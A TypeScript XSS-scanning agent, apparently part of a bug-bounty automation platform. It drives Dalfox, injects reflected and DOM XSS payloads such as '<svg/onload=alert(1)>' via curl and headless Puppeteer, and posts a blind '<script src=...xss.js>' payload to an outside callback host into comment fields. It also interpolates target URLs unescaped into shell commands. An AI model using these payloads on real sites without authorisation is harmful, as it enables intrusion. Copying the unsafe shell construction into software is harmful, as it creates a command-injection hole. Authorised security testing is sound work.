import { Job } from 'bullmq';
import { BaseAgent } from './base';
import { BaseJob } from '../../../shared/types';
import logger from '../utils/logger';
import database from '../services/database';
import storage from '../services/storage';
import events from '../services/events';

export interface XssJob extends BaseJob {
  programId: string;
  urls: string[];
  options: {
    blind?: boolean;
    domXss?: boolean;
    reflectedXss?: boolean;
    storedXss?: boolean;
    deepCrawl?: boolean;
    miningDict?: boolean;
    skipHeadless?: boolean;
    customPayloads?: string[];
    threads?: number;
    timeout?: number;
  };
}

export interface XssResult {
  vulnerabilities: Array<{
    url: string;
    parameter: string;
    type: 'reflected' | 'stored' | 'dom' | 'blind';
    payload: string;
    evidence: string;
    severity: 'critical' | 'high' | 'medium' | 'low';
    confidence: number;
    poc: string;
  }>;
  testedUrls: number;
  testedParameters: number;
  executionTime: number;
}

/**
 * XSS Vulnerability Scanning Agent
 *
 * Features:
 * - Reflected XSS detection with DOM validation
 * - Stored XSS testing with persistent payloads
 * - DOM-based XSS with headless browser verification
 * - Blind XSS with out-of-band detection
 * - Custom payload injection
 * - Parameter mining and fuzzing
 * - Multi-threaded scanning
 * - Comprehensive PoC generation
 */
export class XssAgent extends BaseAgent<XssJob> {
  constructor() {
    super('xss' as any);
  }

  async process(job: Job<XssJob>): Promise<XssResult> {
    const { programId, urls, options } = job.data;
    const startTime = Date.now();

    await this.updateJobStatus(job.id, 'active');
    await this.logExecution(
      job.id,
      programId,
      'xss',
      'start',
      'info',
      `Starting XSS scanning on ${urls.length} URLs`
    );

    const result: XssResult = {
      vulnerabilities: [],
      testedUrls: 0,
      testedParameters: 0,
      executionTime: 0,
    };

    try {
      // Save URLs to temporary file
      const urlsFile = `/tmp/xss-urls-${job.id}.txt`;
      const fs = require('fs');
      fs.writeFileSync(urlsFile, urls.join('\n'));

      // Check for cancellation
      if (await this.shouldCancel(job.id)) {
        throw new Error('Job cancelled');
      }

      // Run Dalfox for comprehensive XSS testing
      await this.logExecution(job.id, programId, 'dalfox', 'start', 'info', 'Running Dalfox XSS scanner');
      const dalfoxResults = await this.runDalfox(urlsFile, options, job.id, programId, urls.length);
      result.vulnerabilities.push(...dalfoxResults);

      // Run custom XSS tests
      if (options.customPayloads && options.customPayloads.length > 0) {
        await this.logExecution(job.id, programId, 'xss-custom', 'start', 'info', 'Testing custom payloads');
        const customResults = await this.runCustomTests(urls, options.customPayloads, job.id, programId);
        result.vulnerabilities.push(...customResults);
      }

      // Test for DOM-based XSS with headless browser
      if (options.domXss !== false && !options.skipHeadless) {
        await this.logExecution(job.id, programId, 'dom-xss', 'start', 'info', 'Testing DOM XSS with headless browser');
        const domResults = await this.runDomXssTests(urls, job.id, programId);
        result.vulnerabilities.push(...domResults);
      }

      // Test for blind XSS
      if (options.blind !== false && process.env.XSS_SERVER) {
        await this.logExecution(job.id, programId, 'blind-xss', 'start', 'info', 'Testing blind XSS');
        const blindResults = await this.runBlindXssTests(urls, job.id, programId);
        result.vulnerabilities.push(...blindResults);
      }

      result.testedUrls = urls.length;
      result.executionTime = Date.now() - startTime;

      // Save findings to database
      await this.saveXssFindings(programId, result.vulnerabilities);

      // Cleanup
      try {
        fs.unlinkSync(urlsFile);
      } catch (e) {
        // Ignore cleanup errors
      }

      await this.logExecution(
        job.id,
        programId,
        'xss',
        'complete',
        'info',
        `XSS scanning complete: ${result.vulnerabilities.length} vulnerabilities found in ${result.executionTime}ms`
      );

      await this.updateJobStatus(job.id, 'completed', result);
      return result;
    } catch (error: any) {
      await this.logExecution(job.id, programId, 'xss', 'error', 'error', error.message);
      await this.updateJobStatus(job.id, 'failed', null, error.message);
      throw error;
    }
  }

  /**
   * Run Dalfox XSS scanner
   */
  private async runDalfox(
    urlsFile: string,
    options: XssJob['options'],
    jobId: string,
    programId: string,
    urlsCount: number
  ): Promise<XssResult['vulnerabilities']> {
    const vulnerabilities: XssResult['vulnerabilities'] = [];

    try {
      const threads = options.threads || 50;
      const timeout = options.timeout || 10;

      // Build Dalfox command
      let dalfoxCmd = `dalfox file ${urlsFile}`;
      dalfoxCmd += ` --format json`;
      dalfoxCmd += ` --worker ${threads}`;
      dalfoxCmd += ` --timeout ${timeout}`;
      dalfoxCmd += ` --silence`;

      // Add scanning options
      if (options.blind !== false && process.env.XSS_SERVER) {
        dalfoxCmd += ` --blind ${process.env.XSS_SERVER}`;
      }

      if (options.deepCrawl) {
        dalfoxCmd += ` --deep-crawl`;
      }

      if (options.miningDict) {
        dalfoxCmd += ` --mining-dict`;
      }

      if (options.skipHeadless) {
        dalfoxCmd += ` --skip-headless`;
      }

      // Output file
      const outputFile = `/tmp/dalfox-${jobId}.json`;
      dalfoxCmd += ` -o ${outputFile}`;

      logger.info({ command: dalfoxCmd }, 'Running Dalfox');

      const { stdout, stderr, exitCode } = await this.executeCommand(dalfoxCmd, {
        timeout: options.timeout ? options.timeout * 1000 * urlsCount : 600000,
      });

      // Parse results
      try {
        const fs = require('fs');
        if (fs.existsSync(outputFile)) {
          const results = JSON.parse(fs.readFileSync(outputFile, 'utf8'));

          if (Array.isArray(results)) {
            for (const finding of results) {
              vulnerabilities.push({
                url: finding.url || finding.data?.url || '',
                parameter: finding.param || finding.data?.param || '',
                type: this.categorizeXssType(finding),
                payload: finding.payload || finding.data?.payload || '',
                evidence: finding.evidence || finding.message || '',
                severity: this.calculateSeverity(finding),
                confidence: this.calculateConfidence(finding),
                poc: this.generatePoc(finding),
              });
            }
          }

          // Cleanup
          fs.unlinkSync(outputFile);
        }
      } catch (parseError: any) {
        logger.error({ error: parseError.message }, 'Failed to parse Dalfox results');
      }

      logger.info({ count: vulnerabilities.length }, 'Dalfox scan complete');
      return vulnerabilities;
    } catch (error: any) {
      logger.error({ error: error.message }, 'Dalfox scan failed');
      return vulnerabilities;
    }
  }

  /**
   * Run custom XSS payload tests
   */
  private async runCustomTests(
    urls: string[],
    payloads: string[],
    jobId: string,
    programId: string
  ): Promise<XssResult['vulnerabilities']> {
    const vulnerabilities: XssResult['vulnerabilities'] = [];

    try {
      for (const url of urls.slice(0, 20)) { // Limit to first 20 URLs for custom tests
        if (await this.shouldCancel(jobId)) break;

        for (const payload of payloads) {
          // Test each payload
          const testUrl = url.includes('?') ? `${url}&xss=${encodeURIComponent(payload)}` : `${url}?xss=${encodeURIComponent(payload)}`;

          const curlCmd = `curl -s -L --max-time 10 "${testUrl}" || echo ""`;
          const { stdout } = await this.executeCommand(curlCmd, { timeout: 15000 });

          // Check if payload is reflected in response
          if (stdout.includes(payload) || stdout.includes(encodeURIComponent(payload))) {
            vulnerabilities.push({
              url,
              parameter: 'xss',
              type: 'reflected',
              payload,
              evidence: `Payload reflected in response: ${stdout.substring(0, 200)}...`,
              severity: 'high',
              confidence: 0.7,
              poc: `curl -X GET "${testUrl}"`,
            });
          }

          // Rate limiting
          await new Promise(resolve => setTimeout(resolve, 100));
        }
      }

      logger.info({ count: vulnerabilities.length }, 'Custom XSS tests complete');
      return vulnerabilities;
    } catch (error: any) {
      logger.error({ error: error.message }, 'Custom XSS tests failed');
      return vulnerabilities;
    }
  }

  /**
   * Test for DOM-based XSS using headless browser
   */
  private async runDomXssTests(
    urls: string[],
    jobId: string,
    programId: string
  ): Promise<XssResult['vulnerabilities']> {
    const vulnerabilities: XssResult['vulnerabilities'] = [];

    try {
      // Use domdig or similar tool for DOM XSS detection
      const domPayloads = [
        '#<img src=x onerror=alert(1)>',
        '#javascript:alert(1)',
        '#<svg/onload=alert(1)>',
      ];

      for (const url of urls.slice(0, 10)) { // Limit DOM tests
        if (await this.shouldCancel(jobId)) break;

        for (const payload of domPayloads) {
          const testUrl = `${url}${payload}`;

          // Use headless chrome to test
          const testCmd = `timeout 15 node -e "
            const puppeteer = require('puppeteer');
            (async () => {
              const browser = await puppeteer.launch({ headless: true, args: ['--no-sandbox'] });
              const page = await browser.newPage();
              let alerted = false;
              page.on('dialog', async dialog => { alerted = true; await dialog.dismiss(); });
              await page.goto('${testUrl}', { waitUntil: 'networkidle2', timeout: 10000 }).catch(() => {});
              await page.waitForTimeout(2000);
              console.log(alerted ? 'VULNERABLE' : 'SAFE');
              await browser.close();
            })();
          " 2>/dev/null || echo "SAFE"`;

          const { stdout } = await this.executeCommand(testCmd, { timeout: 20000 });

          if (stdout.includes('VULNERABLE')) {
            vulnerabilities.push({
              url,
              parameter: 'fragment',
              type: 'dom',
              payload,
              evidence: 'Alert triggered in headless browser',
              severity: 'high',
              confidence: 0.95,
              poc: `Open ${testUrl} in browser`,
            });
          }

          await new Promise(resolve => setTimeout(resolve, 500));
        }
      }

      logger.info({ count: vulnerabilities.length }, 'DOM XSS tests complete');
      return vulnerabilities;
    } catch (error: any) {
      logger.error({ error: error.message }, 'DOM XSS tests failed');
      return vulnerabilities;
    }
  }

  /**
   * Test for blind XSS
   */
  private async runBlindXssTests(
    urls: string[],
    jobId: string,
    programId: string
  ): Promise<XssResult['vulnerabilities']> {
    const vulnerabilities: XssResult['vulnerabilities'] = [];

    try {
      if (!process.env.XSS_SERVER) {
        return vulnerabilities;
      }

      const blindPayload = `<script src="${process.env.XSS_SERVER}/xss.js?id=${jobId}"></script>`;

      for (const url of urls.slice(0, 30)) {
        if (await this.shouldCancel(jobId)) break;

        // Inject blind XSS payload
        const testUrl = url.includes('?')
          ? `${url}&payload=${encodeURIComponent(blindPayload)}`
          : `${url}?payload=${encodeURIComponent(blindPayload)}`;

        const curlCmd = `curl -s -X POST -d "comment=${encodeURIComponent(blindPayload)}" "${url}" --max-time 10 || echo ""`;
        await this.executeCommand(curlCmd, { timeout: 15000 });

        await new Promise(resolve => setTimeout(resolve, 200));
      }

      // Wait for callbacks
      await new Promise(resolve => setTimeout(resolve, 5000));

      // Check for callbacks (this would require integration with XSS Hunter or similar)
      logger.info('Blind XSS payloads injected, waiting for callbacks');

      return vulnerabilities;
    } catch (error: any) {
      logger.error({ error: error.message }, 'Blind XSS tests failed');
      return vulnerabilities;
    }
  }

  /**
   * Categorize XSS type from Dalfox finding
   */
  private categorizeXssType(finding: any): 'reflected' | 'stored' | 'dom' | 'blind' {
    const message = (finding.message || '').toLowerCase();
    const type = (finding.type || '').toLowerCase();

    if (message.includes('stored') || type.includes('stored')) return 'stored';
    if (message.includes('dom') || type.includes('dom')) return 'dom';
    if (message.includes('blind') || type.includes('blind')) return 'blind';
    return 'reflected';
  }

  /**
   * Calculate severity based on finding details
   */
  private calculateSeverity(finding: any): 'critical' | 'high' | 'medium' | 'low' {
    const type = this.categorizeXssType(finding);

    if (type === 'stored') return 'critical';
    if (type === 'dom' || type === 'reflected') return 'high';
    if (type === 'blind') return 'medium';
    return 'low';
  }

  /**
   * Calculate confidence score
   */
  private calculateConfidence(finding: any): number {
    if (finding.verified === true) return 1.0;
    if (finding.evidence && finding.evidence.length > 100) return 0.9;
    if (finding.poc) return 0.8;
    return 0.6;
  }

  /**
   * Generate PoC for XSS finding
   */
  private generatePoc(finding: any): string {
    const url = finding.url || finding.data?.url || '';
    const param = finding.param || finding.data?.param || '';
    const payload = finding.payload || finding.data?.payload || '';

    if (!url || !payload) return 'Manual verification required';

    const separator = url.includes('?') ? '&' : '?';
    return `curl -X GET "${url}${separator}${param}=${encodeURIComponent(payload)}"`;
  }

  /**
   * Save XSS findings to database
   */
  private async saveXssFindings(programId: string, vulnerabilities: XssResult['vulnerabilities']): Promise<void> {
    try {
      for (const vuln of vulnerabilities) {
        // Check if finding already exists
        const existing = await database.query(
          `SELECT id FROM findings WHERE program_id = $1 AND title = $2 AND evidence->0->>'content' = $3`,
          [programId, `XSS Vulnerability - ${vuln.type}`, vuln.url]
        );

        if (existing.rows.length > 0) {
          logger.debug({ url: vuln.url }, 'XSS finding already exists, skipping');
          continue;
        }

        await database.query(
          `INSERT INTO findings (
            program_id, title, description, severity, confidence, status,
            evidence, poc, tags
          ) VALUES ($1, $2, $3, $4, $5, 'new', $6, $7, $8)`,
          [
            programId,
            `XSS Vulnerability - ${vuln.type.toUpperCase()}`,
            `${vuln.type.charAt(0).toUpperCase() + vuln.type.slice(1)} XSS vulnerability found at ${vuln.url}`,
            vuln.severity,
            vuln.confidence,
            JSON.stringify([
              {
                type: 'request',
                content: vuln.url,
                metadata: { parameter: vuln.parameter },
              },
              {
                type: 'response',
                content: vuln.evidence,
              },
            ]),
            JSON.stringify({
              steps: [
                `Navigate to: ${vuln.url}`,
                `Inject payload: ${vuln.payload}`,
                `Observe XSS execution`,
              ],
              curl: vuln.poc,
              payload: vuln.payload,
              reproductionRate: vuln.confidence,
            }),
            ['xss', vuln.type, vuln.parameter],
          ]
        );

        // Emit finding event
        await events.emitFinding({
          programId,
          severity: vuln.severity,
          title: `XSS Vulnerability - ${vuln.type.toUpperCase()}`,
          url: vuln.url,
        } as any);
      }

      logger.info({ count: vulnerabilities.length, programId }, 'XSS findings saved to database');
    } catch (error: any) {
      logger.error({ error: error.message, programId }, 'Failed to save XSS findings');
    }
  }
}
